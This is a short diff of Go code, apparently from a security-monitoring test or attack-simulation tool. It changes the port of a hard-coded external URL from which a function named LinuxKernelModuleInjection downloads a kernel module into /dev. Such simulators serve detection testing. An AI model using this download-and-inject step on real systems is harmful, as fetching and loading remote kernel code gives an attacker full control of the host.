@@ -243,7 +243,7 @@ func DirectoryTraversalMonitoredFileRead() {
 func LinuxKernelModuleInjection() error {
 	fmt.Println("Ejecutando: Linux Kernel Module Injection")
 
-	url := "http://34.27.180.215/sitio/cust0m_mod.ko"
+	url := "http://34.27.180.215:8080/sitio/cust0m_mod.ko"
 	filePath := "/dev/cust0m_mod.ko"
 	//dirPath := "/dev/ddd"
 	//filePath := filepath.Join(dirPath, "cust0m_mod.ko")
